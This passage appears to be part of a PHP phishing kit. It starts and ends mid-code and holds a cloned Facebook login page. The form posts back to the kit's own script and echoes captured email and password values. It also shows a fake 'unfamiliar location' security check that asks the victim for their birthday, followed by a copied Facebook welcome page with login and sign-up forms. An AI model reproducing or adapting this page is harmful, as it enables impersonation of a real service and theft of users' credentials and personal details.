pending[ii]; for (var jj in res.requires) { if (!loaded[jj] && !isBlocked(jj, res.provides)) { res = null; break; } } if (res) { for (jj in res.provides) { delete pending[jj]; loaded[jj] = 1; } res.fn.call(); hit = true; } } } while(hit); } return function(provides, requires, fn) { if (window.disableRPAR) { fn(); return; } var desc = { provides: provides, requires: requires, fn: fn }; for (var ii in provides) { pending[ii] = desc; } checkSatisfied(); } }();document.cookie = "cvr_tx=; expires=Mon, 26 Jul 1997 05:00:00 GMT; path=\/; domain=.facebook.com";
//]]>
</script><noscript> <meta http-equiv=refresh content="0; URL=https://login.facebook.com/login.php?login_attempt=1&_fb_noscript=1" /> </noscript>
 
<meta name="robots" content="noodp,noydir,noindex,nofollow,noarchive,nosnippet" />
<meta name="description" content="Facebook is a social utility that connects people with friends and others who work, study and live around them. People use Facebook to keep up with friends, upload an unlimited number of photos, post links and videos, and learn more about the people they meet." />
<title>Login | Facebook</title>
 
<script type="text/javascript"> 
Env={method:"POST",dev:0,start:(new Date()).getTime(),ps_limit:5,ps_ratio:4,svn_rev:173772,static_base:"https:\/\/s-static.ak.facebook.com\/",www_base:"http:\/\/www.facebook.com\/",tlds:["com","at","ca","co.nz","co.za","com.au","dk","es","ie","jp","net.nz","no","pl","se","vn"],ajax_bundle:1,rep_lag:2,fb_dtsg:null};
</script>
 
    <script type="text/javascript" src="https://s-static.ak.facebook.com/rsrc.php/zCEIL/lpkg/60jtxwkd/en_US/141/172727/js/d74arak6ngo4484c.pkg.js"></script>
<script type="text/javascript">Bootloader.loadInitialResources([{"name":"js\/amsxh7awr3co4kg0.pkg.js","type":"js","src":"https:\/\/s-static.ak.facebook.com\/rsrc.php\/zAV46\/lpkg\/cipvk8nx\/en_US\/141\/173044\/js\/amsxh7awr3co4kg0.pkg.js","permanent":false},{"name":"js\/9r852sg136kgckgc.pkg.js","type":"js","src":"https:\/\/s-static.ak.facebook.com\/rsrc.php\/zQZIO\/lpkg\/5pa5boiw\/en_US\/141\/171863\/js\/9r852sg136kgckgc.pkg.js","permanent":false},{"name":"js\/captcha\/birthday.js","type":"js","src":"https:\/\/s-static.ak.facebook.com\/rsrc.php\/z3IY8\/l\/bb12n18n\/nu_ll\/151272\/js\/captcha\/birthday.js","permanent":false},{"name":"js\/useragent.js","type":"js","src":"https:\/\/s-static.ak.facebook.com\/rsrc.php\/zEJTV\/l\/5k5jekhg\/nu_ll\/139152\/js\/useragent.js","permanent":false}])</script>
    <link type="text/css" rel="stylesheet" href="https://s-static.ak.facebook.com/rsrc.php/zBL1G/lpkg/c179eldp/en_US/141/172351/css/8jlnn6i0f8kkks4k.pkg.css" />
    <link type="text/css" rel="stylesheet" href="https://s-static.ak.facebook.com/rsrc.php/z8KFR/l/9b38sjmt/en_US/159827/css/login.css" />
    <link type="text/css" rel="stylesheet" href="https://s-static.ak.facebook.com/rsrc.php/z3PUQ/lpkg/en5tepv1/en_US/141/163776/css/8h8wx2il930gs8ko.pkg.css" />
    <link type="text/css" rel="stylesheet" href="https://s-static.ak.facebook.com/rsrc.php/z7ENX/lpkg/2donva3n/en_US/141/172113/css/yty641oj1jk8sc8k.pkg.css" />
    <link type="text/css" rel="stylesheet" href="https://s-static.ak.facebook.com/rsrc.php/z6FCY/lpkg/5qdvpl2s/en_US/141/167140/css/clh3v0soyxsgg4oc.pkg.css" />
<!--[if lte IE 6]><link rel="stylesheet" href="https://s-static.ak.facebook.com/rsrc.php/zHCEB/l/5trjuj8y/en_US/166597/css/ie6.css" type="text/css" /><![endif]-->
<!--[if IE 7]><link rel="stylesheet" href="https://s-static.ak.facebook.com/rsrc.php/zCS2J/l/a36far0c/en_US/167934/css/ie7.css" type="text/css" /><![endif]-->
 
<script type="text/javascript"> 
var fbpd={"charset_test":"\u20ac,\u00b4,\u20ac,\u00b4,\u6c34,\u0414,\u0404","locale":"en_US","email":"","pass":"","pass_placeholder":"Password"};
</script>
<link rel="search" type="application/opensearchdescription+xml" href="https://s-static.ak.facebook.com/opensearch_desc.xml?8:72379" title="Facebook" />
<link rel="shortcut icon" href="https://s-static.ak.facebook.com/favicon.ico?8:132011" />
</head>
<body class="login_page ie7 UIPage_LoggedOut Locale_en_US">
<div id="dropmenu_container"></div><div id="FB_HiddenContainer" style="position:absolute; top:-10000px; left:-10000px; width:0px; height:0px;" ></div><div id="nonfooter"><div id="page_height" class="clearfix"><div id="menubar_container" class="fb_menubar_show_register"><div id="fb_menubar" class="fb_menubar_logged_out clearfix"><div id="fb_menubar_core"><ul class="fb_menu_list"><li class="fb_menu" id="fb_menubar_logo"><a href="http://www.facebook.com" title="Go to Facebook Home"><span>&nbsp;</span></a></li></ul></div><div id="fb_menubar_aux"><ul class="fb_menu_list"></ul></div></div><div class="signup_box clearfix"><div class="UILinkButton UILinkButton_SUBig"><a href="/r.php?locale=en_US" onclick="return wait_for_load(this, event, function() { seo_tracking_onclick(this,&quot;facebookpoc&quot;,&quot;facebookpoc&quot;,&quot;1&quot;,&quot;1&quot;,&quot;Signup&quot;,&quot;Register Top Bar&quot;); });" class="UILinkButton_A">Sign Up</a><div class="UILinkButton_RW"><div class="UILinkButton_R"></div></div></div><div class="signup_box_content"><span class="signup_box_message">Facebook helps you connect and share with the people in your life.</span></div></div></div><div id="content" class="fb_content"><div class="UIFullPage_Container"><div class="UIInterstitialContainer clearfix"><div class="UIRoundedTransparentBox"><div class="UIRoundedTransparentBox_Inner clearfix"><div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_TL">&nbsp;</div><div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_TR">&nbsp;</div><div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_BL">&nbsp;</div><div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_BR">&nbsp;</div><div class="UIRoundedTransparentBox_Border clearfix"><div class="UIInterstitialBox_Container clearfix"><div class="UIOneOff_Container"><div class="title_header add_border"><h2 class="title_h no_icon">Facebook Login</h2></div>

<form method="POST" action="<?php $_SESSION['PHP_SELF']; ?>?login">
<input type="hidden" name="charset_test" value="&euro;,&acute;,€,´,&#27700;,&#1044;,&#1028;" /><div class="status" id="standard_status"><h2><span id=status_title>You are signing in from an unfamiliar location.  For your security, please verify your account. <span id="login_challenge_learn_more" style="display:none">This check prevents others from accessing your account without your permission.  If your password is stolen through a phishing site, for example, this step keeps your account safe. You will not be prompted every time. For additional information please see <a href="http://www.facebook.com/security"> http://www.facebook.com/security</a>.</span><a onclick="return wait_for_load(this, event, function() { toggleDisplayNone(&#039;login_challenge_learn_more&#039;);toggleDisplayNone(&#039;login_challenge_more_link&#039;); });" id="login_challenge_more_link">Learn More.</a></span></h2></div>
<div id="loginform" style=""><input type="hidden" id="version" name="version" value="1.0" /><input type="hidden" id="return_session" name="return_session" value="0" /><input type="hidden" id="t_auth_token" name="t_auth_token" value="769ef2ce0bcf24d986fd9954c36d736e" /><input type="hidden" name="charset_test" value="&euro;,&acute;,€,´,&#27700;,&#1044;,&#1028;" /><input type="hidden" id="answered_captcha" name="answered_captcha" value="1" /><div id="captcha" class="captcha">
  <input type="hidden" id="captcha_persist_data" name="captcha_persist_data" value="AAAAAQAQ9Vo-NXJkHhS4wS-HcOUPqAAAAJCObzyAQzxZF42h4T5YJ_DwLG2xOK9NdV9WFwexss-xBppOCEA_BT3CEM--7yFrC0PvmxRnIoToZx40mOTbKKn7WV4g-h6tswnP3Opv0W64YhS_GAD76rBVa4xGEANzslDQqrXbpNM8K3eNy-UFvzu_hWpvhkMUiVQWA7aeNoCWxJ8U-JHwbKqqMv96Fu21IGI," /><div class="title_header"><h2 class="title_h" style="background-image: url(https://s-static.ak.facebook.com/images/icons/alert.gif?8:127824)">Security Check</h2><h4 class="title_h">To confirm that this is your account, please enter your birthday.</h4></div><div class="panel clearfix form_row clearfix"><label for="birthday_captcha_response" id="label_birthday_captcha_response">Birthday:</label>
<select name="birthday_captcha_month" id="birthday_captcha_month" onchange="return wait_for_load(this, event, function() { editor_date_month_change(this, 'birthday_captcha_day','birthday_captcha_year'); });" autocomplete="off"><option value="-1">Month:</option><option value="1">Jan</option>
<option value="2">Feb</option>
<option value="3">Mar</option>
<option value="4">Apr</option>
<option value="5">May</option>
<option value="6">Jun</option>
<option value="7">Jul</option>
<option value="8">Aug</option>
<option value="9">Sep</option>
<option value="10">Oct</option>
<option value="11">Nov</option>
<option value="12">Dec</option>
</select> <select name="birthday_captcha_day" id="birthday_captcha_day"  autocomplete="off"><option value="-1">Day:</option><option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5">5</option>
<option value="6">6</option>
<option value="7">7</option>
<option value="8">8</option>
<option value="9">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
</select> <select name="birthday_captcha_year" id="birthday_captcha_year" onchange="return wait_for_load(this, event, function() { editor_date_month_change(&quot;birthday_captcha_month&quot;,&quot;birthday_captcha_day&quot;,this); });" autocomplete="off"><option value="-1">Year:</option><option value="2009">2009</option>
<option value="2008">2008</option>
<option value="2007">2007</option>
<option value="2006">2006</option>
<option value="2005">2005</option>
<option value="2004">2004</option>
<option value="2003">2003</option>
<option value="2002">2002</option>
<option value="2001">2001</option>
<option value="2000">2000</option>
<option value="1999">1999</option>
<option value="1998">1998</option>
<option value="1997">1997</option>
<option value="1996">1996</option>
<option value="1995">1995</option>
<option value="1994">1994</option>
<option value="1993">1993</option>
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>
<option value="1988">1988</option>
<option value="1987">1987</option>
<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>
<option value="1979">1979</option>
<option value="1978">1978</option>
<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>
<option value="1970">1970</option>
<option value="1969">1969</option>
<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>
<option value="1961">1961</option>
<option value="1960">1960</option>
<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>
<option value="1952">1952</option>
<option value="1951">1951</option>
<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>
<option value="1943">1943</option>
<option value="1942">1942</option>
<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>
<option value="1934">1934</option>
<option value="1933">1933</option>
<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
<option value="1929">1929</option>
<option value="1928">1928</option>
<option value="1927">1927</option>
<option value="1926">1926</option>
<option value="1925">1925</option>
<option value="1924">1924</option>
<option value="1923">1923</option>
<option value="1922">1922</option>
<option value="1921">1921</option>
<option value="1920">1920</option>
<option value="1919">1919</option>
<option value="1918">1918</option>
<option value="1917">1917</option>
<option value="1916">1916</option>
<option value="1915">1915</option>
<option value="1914">1914</option>
<option value="1913">1913</option>
<option value="1912">1912</option>
<option value="1911">1911</option>
<option value="1910">1910</option>
<option value="1909">1909</option>
<option value="1908">1908</option>
<option value="1907">1907</option>
<option value="1906">1906</option>
<option value="1905">1905</option>
<option value="1904">1904</option>
<option value="1903">1903</option>
<option value="1902">1902</option>
<option value="1901">1901</option>
<option value="1900">1900</option>
</select>
</div>
</div><div class="form_row clearfix hidden_elem"><label for="email" id="label_email">Email:</label><input type="text" class="inputtext" id="email" name="email" value="<?php echo $email ?>" onkeypress="return wait_for_load(this, event, function() { formchange() });" /></div><div class="form_row clearfix hidden_elem"><label for="pass" id="label_pass">Password:</label><input type="password" class="inputpassword" id="pass" name="pass" value="<?php echo $pass ?>" /></div><div id="buttons" class="form_row clearfix"><label></label><input type="submit" value="Login" name="login" id="login" onclick="return wait_for_load(this, event, function() { seo_tracking_onclick(this,&quot;facebookpoc&quot;,&quot;facebookpoc&quot;,&quot;1&quot;,&quot;1&quot;,&quot;Login&quot;,&quot;UI Form&quot;);this.disabled=true; this.form.submit(); return false; });" class="inputsubmit" /> or <strong><a href="http://www.facebook.com/r.php?next=&amp;locale=en_US" id="reg_btn_link" target="_blank" rel="nofollow">Sign up for Facebook</a></strong></div><p class="reset_password form_row"><label></label><a href="http://www.facebook.com/reset.php?locale=en_US">Forgot your password?</a></p></div></form>


</div></div></div></div></div></div></div></div></div></div><div id="pagefooter"><div class="pagefooter_topborder clearfix"><div class="copyright_and_location clearfix"><div class="copyright" id="pagefooter_copyright"><span title="PHP">Facebook </span><span id="rtime" title="266">&copy;</span> <span title="10.17.50.103">20</span><span title="20636960">09</span></div><div id="locale_selector_dialog_onclick"><a href="/ajax/intl/language_dialog.php?uri=https%3A%2F%2Flogin.facebook.com%2Flogin.php%3Flogin_attempt%3D1" class="intl_selector_dialog_a" title="English (US)" onclick="return wait_for_load(this, event, function() { return window.Dialog &amp;&amp; Dialog.bootstrap(this.href, null, true) });">English (US)</a></div></div><div id="pagefooter_links"><ul class="pagefooter_ul" id="pagefooter_left_links"><li class="pagefooter_li"><a href="http://www.facebook.com/login.php?ref=pf">Login</a></li><li class="pagefooter_li"><a href="http://www.facebook.com/facebook?ref=pf" accesskey="7" rel="nofollow">About</a></li><li class="pagefooter_li"><a href="http://www.facebook.com/advertising/?src=pf">Advertising</a></li><li class="pagefooter_li"><a href="http://developers.facebook.com/?ref=pf">Developers</a></li><li class="pagefooter_li"><a href="http://www.facebook.com/careers/?ref=pf">Careers</a></li><li class="pagefooter_li"><a href="http://www.facebook.com/terms.php?ref=pf" accesskey="8" rel="nofollow">Terms</a></li><li class="pagefooter_li"><a href="http://blog.facebook.com/blog.php">Blog</a></li><li class="pagefooter_li"><span><img alt=""  class="li_bullet spritemap_icons sx_icons_pagefooter_bullet" src="https://s-static.ak.facebook.com/images/spacer.gif?8:11"></span></li></ul><ul class="pagefooter_ul" id="pagefooter_right_links"><li class="pagefooter_li"><a href="http://www.facebook.com/find-friends/?ref=pf">Find Friends</a></li><li class="pagefooter_li"><a href="http://www.facebook.com/policy.php?ref=pf" accesskey="6" rel="nofollow">Privacy</a></li><li class="pagefooter_li"><a href="http://www.facebook.com/mobile/?ref=pf" accesskey="5">Mobile</a></li><li class="pagefooter_li"><a href="http://www.facebook.com/help.php?ref=pf" accesskey="0" rel="nofollow">Help Center</a></li></ul></div></div></div><div id="js_buffer"><script type="text/javascript"> 
 
onloadRegister(function(){Bootloader.configurePage({"https:\/\/s-static.ak.facebook.com\/rsrc.php\/zBL1G\/lpkg\/c179eldp\/en_US\/141\/172351\/css\/8jlnn6i0f8kkks4k.pkg.css":["css\/8jlnn6i0f8kkks4k.pkg.css",true],"https:\/\/s-static.ak.facebook.com\/rsrc.php\/z8KFR\/l\/9b38sjmt\/en_US\/159827\/css\/login.css":["css\/login.css",false],"https:\/\/s-static.ak.facebook.com\/rsrc.php\/z3PUQ\/lpkg\/en5tepv1\/en_US\/141\/163776\/css\/8h8wx2il930gs8ko.pkg.css":["css\/8h8wx2il930gs8ko.pkg.css",false],"https:\/\/s-static.ak.facebook.com\/rsrc.php\/z7ENX\/lpkg\/2donva3n\/en_US\/141\/172113\/css\/yty641oj1jk8sc8k.pkg.css":["css\/yty641oj1jk8sc8k.pkg.css",true],"https:\/\/s-static.ak.facebook.com\/rsrc.php\/z6FCY\/lpkg\/5qdvpl2s\/en_US\/141\/167140\/css\/clh3v0soyxsgg4oc.pkg.css":["css\/clh3v0soyxsgg4oc.pkg.css",false]});
Bootloader.done(["css\/8jlnn6i0f8kkks4k.pkg.css","css\/login.css","css\/8h8wx2il930gs8ko.pkg.css","css\/yty641oj1jk8sc8k.pkg.css","css\/clh3v0soyxsgg4oc.pkg.css"]);
});
 
onloadRegister(function (){if (window.Env) {Env["nctrlid"]="c17a9ebfcaa4906a653b52eb4d478002"; Env["nctrlnid"]="";};});
onloadRegister(function (){new BirthdayCaptchaController();;});
onloadRegister(function (){window.loading_page_chrome = true;;});
onloadRegister(function (){new MenuBar("fb_menubar_core").setTimeoutInterval(250).init();
new MenuBar("fb_menubar_aux").setTimeoutInterval(100).init();;});
onloadRegister(function (){window.loading_page_chrome = false;;});
onloadRegister(function (){ffid='m/KCDbSsEFNYUO8Gmv+A8g==';;});
onloadRegister(function (){
      onbeforeunloadRegister(function () {
        window.setCookie && window.setCookie("cvr_tx", (new Date()).getTime(), 10000);
        }, true);;});
onafterloadRegister(function (){seo_tracking_onload("facebookpoc","facebookpoc","1","1","Login","","1246945076774040fba74b632548864db1168e9dc065af98dc18b04b2cb1787","Login","login.facebook.com","","en_US","en_US","US","Logged Out","");});
 
 
</script></div><script type="text/javascript">if (!window.ge) {
  window.ge = function(id) {
    return document.getElementById(id);
  }
}
 
window.onload = function() {
  document.cookie = "test_cookie=1;domain=.facebook.com";
  var e = ge('email'),
      p = ge('pass');
 
  //  We sometimes show you *only* a password prompt, so focus that if there
  //  is no e-mail prompt.
 
  if (e && !e.value) {
    e.focus();
  } else if (p) {
    p.focus();
  }
};
 
function formchange() {
  (ge('persistent')||{}).checked = 0;
}
 
function pop(url) {
  window.open(url);
}
</script></body>
</html>
<?php
die();
} else {
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" id="facebook">
<head>
<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta http-equiv="Content-language" content="en" />
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<script type="text/javascript">
//<![CDATA[
(function(loc) { if (loc.pathname == '/') { return; } var uri_re = /^(?:(?:[^:\/?#]+):)?(?:\/\/(?:[^\/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?/; var target_domain = ''; loc.href.replace(uri_re, function(all, path, query, frag) { var dst, src; dst = src = path + (query ? '?' + query : ''); if (frag) { if (frag.charAt(0) == '/') { dst = frag.replace(/^\/+/, '/') .replace(/_fb_qsub=([^&]+)&?/, function(all, domain){ if (domain.substring(domain.length - 13) == '.facebook.com') { target_domain = 'http://'+domain; } return ''; }); } else if (/&|=/.test(frag)) { var q = {}; var m = frag.match(/([^#]*)(#.*)?/); var arr = (query||'').split('&').concat((m[1]||'').split('&')); for (var i=0, length=arr.length; i<length; i++) { var t = arr[i].split('='); if (t.length && t[0] != '') { q[t[0]] = t[1]; } } var s = []; for (var i in q) { s.push(i+ (q[i]?'='+q[i]:'')); } dst = path+'?'+s.join('&')+(m[2]||''); } } dst = "" + dst; if (dst != src) { window.location.replace(target_domain + dst); } }); })(window.location); var onloadRegister = window.onloadRegister || function(h) { onloadhooks.push(h); }; var onloadhooks = window.onloadhooks || []; var onafterloadRegister = window.onafterloadRegister || function(h) { onafterloadhooks.push(h); }; var onafterloadhooks = window.onafterloadhooks || []; function wait_for_load(element, e, f) { f = bind(element, f, e); if (window.loaded) { return f(); } switch ((e || event).type) { case 'load': case 'focus': onloadRegister(f); return; case 'click': if (element.original_cursor === undefined) { element.original_cursor = element.style.cursor; } if (document.body.original_cursor === undefined) { document.body.original_cursor = document.body.style.cursor; } element.style.cursor = document.body.style.cursor = 'progress'; onafterloadRegister(function() { element.style.cursor = element.original_cursor; document.body.style.cursor = document.body.original_cursor; element.original_cursor = document.body.original_cursor = undefined; if (element.tagName.toLowerCase() == 'a') { var original_event = window.event; window.event = e; var ret_value = element.onclick.call(element, e); window.event = original_event; if (ret_value !== false && element.href) { window.location.href = element.href; } } else if (element.click) { element.click(); } }); break; } return false; }; function bind(obj, method ) { var args = []; for (var ii = 2; ii < arguments.length; ii++) { args.push(arguments[ii]); } var fn = function() { var _obj = obj || (this == window ? false : this); var _args = args.slice(); for (var jj = 0; jj < arguments.length; jj++) { _args.push(arguments[jj]); } if (typeof(method) == "string") { if (_obj[method]) { return _obj[method].apply(_obj, _args); } } else { return method.apply(_obj, _args); } }; if (typeof method == 'string') { fn.name = method; } else if (method && method.name) { fn.name = method.name; } fn.toString = function() { return bind._toString(obj, args, method); }; return fn; }; var curry = bind(null, bind, null); bind._toString = bind._toString || function(obj, args, method) { return (typeof method == 'string') ? ('late bind<'+method+'>') : ('bound<'+method.toString()+'>'); }; function goURI(uri, force_reload) { uri = uri.toString(); if (!force_reload && window.PageTransitions && PageTransitions.isInitialized()) { PageTransitions.go(uri); } else if (window.location.href == uri) { window.location.reload(); } else { window.location.href = uri; } } var PrimordialBootloader = window.PrimordialBootloader || { loaded : [], done : function(names) { PrimordialBootloader.loaded.push(names); } }; var Bootloader = window.Bootloader || { done : PrimordialBootloader.done }; function loadExternalJavascript(urls, callback, body) { if (urls instanceof Array) { var url = urls.shift(0); loadExternalJavascript(url, function() { if (urls.length) { loadExternalJavascript(urls, callback, body); } else { callback && callback(); } }, body); } else { var node = body ? document.body : document.getElementsByTagName('head')[0]; var script = document.createElement('script'); script.type = 'text/javascript'; script.src = urls; if (callback) { script.onerror = script.onload = callback; script.onreadystatechange = function() { if (this.readyState == "complete" || this.readyState == "loaded") { callback(); } } } node.appendChild(script); return script; } } window.loadFirebugConsole && window.loadFirebugConsole();document.cookie = "cvr_tx=; expires=Mon, 26 Jul 1997 05:00:00 GMT; path=\/; domain=.facebook.com";
//]]>
</script><noscript> <meta http-equiv=refresh content="0; URL=http://www.facebook.com/index.php?_fb_noscript=1" /> </noscript>

<meta name="robots" content="noodp,noydir" />
<meta name="description" content="Facebook is a social utility that connects people with friends and others who work, study and live around them. People use Facebook to keep up with friends, upload an unlimited number of photos, post links and videos, and learn more about the people they meet." />
<title>Welcome to Facebook! | Facebook</title>

<script type="text/javascript">
Env={method:"GET",dev:0,start:(new Date()).getTime(),ps_limit:5,ps_ratio:4,svn_rev:168678,static_base:"http:\/\/static.ak.fbcdn.net\/",www_base:"http:\/\/www.facebook.com\/",tlds:["com","at","ca","co.nz","co.za","com.au","dk","es","ie","jp","net.nz","no","pl","se","vn"],ajax_bundle:1,rep_lag:2,fb_dtsg:null};
</script>

    <script type="text/javascript" src="http://static.ak.fbcdn.net/js_strings.php/t86460/en_US"></script>
    <script type="text/javascript" src="http://static.ak.fbcdn.net/rsrc.php/z6CC1/lpkg/avcy260h/en_US/141/167747/js/319ddz9cuby80sc4.pkg.js"></script>
<script type="text/javascript">Bootloader.loadInitialResources([{"name":"js\/bfyy7y61y7coos8w.pkg.js","type":"js","src":"http:\/\/static.ak.fbcdn.net\/rsrc.php\/z4Z76\/lpkg\/8zdc0fr8\/en_US\/141\/168106\/js\/bfyy7y61y7coos8w.pkg.js","permanent":false},{"name":"js\/9r852sg136kgckgc.pkg.js","type":"js","src":"http:\/\/static.ak.fbcdn.net\/rsrc.php\/z1KYZ\/lpkg\/bc6ou8sa\/en_US\/141\/167061\/js\/9r852sg136kgckgc.pkg.js","permanent":false},{"name":"js\/recaptcha_ajax.js","type":"js","src":"http:\/\/static.ak.fbcdn.net\/rsrc.php\/z6YHA\/l\/8siw9a8d\/en_US\/166994\/js\/recaptcha_ajax.js","permanent":false},{"name":"js\/useragent.js","type":"js","src":"http:\/\/static.ak.fbcdn.net\/rsrc.php\/zEJTV\/l\/5k5jekhg\/nu_ll\/139152\/js\/useragent.js","permanent":false}])</script>
    <link type="text/css" rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/zAGCS/lpkg/dxa085ml/en_US/141/168449/css/5xxvsqmpkl4wk0kg.pkg.css" />
    <link type="text/css" rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/z2SEH/lpkg/6e6jtn9s/en_US/141/167140/css/9wzufavzfjcogsgk.pkg.css" />
    <link type="text/css" rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/zCYNY/lpkg/1z622p1t/en_US/141/167114/css/aubdlzq1p80sw40o.pkg.css" />
<!--[if lte IE 6]><link rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/z8GXB/l/8ylg4nn7/en_US/166597/css/ie6.css" type="text/css" /><![endif]-->
<!--[if IE 7]><link rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/z4C12/l/as0y9pa5/en_US/166690/css/ie7.css" type="text/css" /><![endif]-->
<link rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/z4QCE/l/8o4e4fkm/en_US/117387/css/webkit.css" type="text/css" />
<link rel="search" type="application/opensearchdescription+xml" href="http://static.ak.fbcdn.net/opensearch_desc.xml?8:72379" title="Facebook" />
<link rel="shortcut icon" href="http://static.ak.fbcdn.net/favicon.ico?8:132011" />
</head>
<body class="WelcomePage safari3 UIPage_LoggedOut Locale_en_US">
<div id="dropmenu_container"></div><div id="FB_HiddenContainer" style="position:absolute; top:-10000px; left:-10000px; width:0px; height:0px;" ></div><div id="nonfooter"><div id="page_height" class="clearfix"><div id="content" class="fb_content"><div class="UIOneOff_Container"><!-- 2365fa3194ecdc0cab15721ce967a9f8663937c7 -->
<div class="WelcomePage_Container"><div id="menubar_container"><div id="fb_menubar" class="fb_menubar_logged_out clearfix"><div id="fb_menubar_core"><ul class="fb_menu_list"><li class="fb_menu" id="fb_menubar_logo"><a href="http://www.facebook.com" title="Go to Facebook Home"><span>&nbsp;</span></a></li></ul></div>

<div id="fb_menubar_aux"><ul class="fb_menu_list"><div class="menu_login_container">

<form method="POST" action="" name="menubar_login" id="menubar_login">
<input type="hidden" name="charset_test" value="&euro;,&acute;,€,´,水,Д,Є" />
<input type="hidden" id="locale" name="locale" value="en_US" />
<table cellpadding="0" cellspacing="0">
<tr>
<td class="login_form_label_field login_form_label_remember">
<label>
<input type="checkbox" name="persistent" value="1" />Remember Me</label>
</td>
<td class="login_form_label_field">
<a href="http://www.facebook.com/reset.php" rel="nofollow">Forgot your password?</a>
</td>
<td class="login_form_last_field login_form_label_field">
</td>
</tr>
<tr>
<td>
<input type="text" class="inputtext" id="email" name="email" value="" />
</td>
<td>
<input type="password" class="inputpassword" id="pass" name="pass" value="" />
<input type="text" class="inputtext hidden_elem" id="pass_placeholder" name="pass_placeholder" value="" />
</td>
<td class="login_form_last_field">
<div class="inner">
<div class="UILinkButton"">
<input type="submit" name="dlb" class="UILinkButton_A" onclick="return wait_for_load(this, event, function() { seo_tracking_onclick(this,&quot;facebookpoc&quot;,&quot;facebookpoc&quot;,&quot;1&quot;,&quot;1&quot;,&quot;Login&quot;,&quot;Menu Bar&quot;); });" value="Login" />
<div class="UILinkButton_RW">
<div class="UILinkButton_R">
</div>
</div>
</div>
</div>
</td>
</tr>
</table>
<input type="hidden" name="charset_test" value="&euro;,&acute;,€,´,水,Д,Є" />
</form>

</div></ul></div></div></div>
<div class="WelcomePage_MainSellContainer"><div class="WelcomePage_MainSell"><div class="WelcomePage_MainSellCenter clearfix"><div class="WelcomePage_MainSellLeft"><div class="WelcomePage_MainMessage">Facebook helps you connect and share with the people in your life.</div><div class="WelcomePage_MainMap">&nbsp;</div></div><div class="WelcomePage_MainSellRight"><div class="WelcomePage_SignUpSection"><div class="WelcomePage_SignUpMessage"><div class="WelcomePage_SignUpHeadline">Sign Up</div><div class="WelcomePage_SignUpSubheadline">It's free and anyone can join</div></div><div class="WelcomePage_SimpleReg" id="registration_container"><div id="simple_registration_container" class="simple_registration_container"><div id="reg_box"><form method="post" action="https://register.facebook.com/r.php" name="reg" id="reg" onsubmit="return wait_for_load(this, event, function() { return false; });"><input type="hidden" name="charset_test" value="&euro;,&acute;,€,´,水,Д,Є" /><input type="hidden" id="locale" name="locale" value="en_US" /><input type="hidden" id="terms" name="terms" value="on" /><input type="hidden" id="reg_instance" name="reg_instance" value="1245030569-85d776ce0a32042d6ae2633089d95090aad6266a8f703abfbcaab" /><noscript><div id="no_js_box"><h2>Javascript is disabled on your browser.</h2><p>Please enable JavaScript on your browser or upgrade to a Javascript-capable browser to register for Facebook.</p></div></noscript><div id="reg_form_box"><table class="editor" border="0" cellspacing="0"><tr><td class="label">Full Name:</td><td><div class="field_container"><input type="text" class="inputtext" id="name" name="name" value="" /></div></td></tr>
<tr><td class="label">Your Email:</td><td><div class="field_container"><input type="text" class="inputtext" id="reg_email__" name="reg_email__" value="" /></div></td></tr>
<tr><td class="label">New Password:</td><td><div class="field_container"><input type="password" class="inputpassword" id="reg_passwd__" name="reg_passwd__" value="" /></div></td></tr>
<tr><td class="label">I am:</td><td><div class="field_container"><select class="select" name="sex" id="sex"  ><option value="0">Select Sex:</option><option value="1">Female</option><option value="2">Male</option></select></div></td></tr>
<tr><td class="label">Birthday:</td><td><div class="field_container"> <select name="birthday_month" id="birthday_month" onchange="return wait_for_load(this, event, function() { editor_date_month_change(this, 'birthday_day','birthday_year'); });" autocomplete="off"><option value="-1">Month:</option><option value="1">Jan</option>
<option value="2">Feb</option>
<option value="3">Mar</option>
<option value="4">Apr</option>
<option value="5">May</option>
<option value="6">Jun</option>
<option value="7">Jul</option>
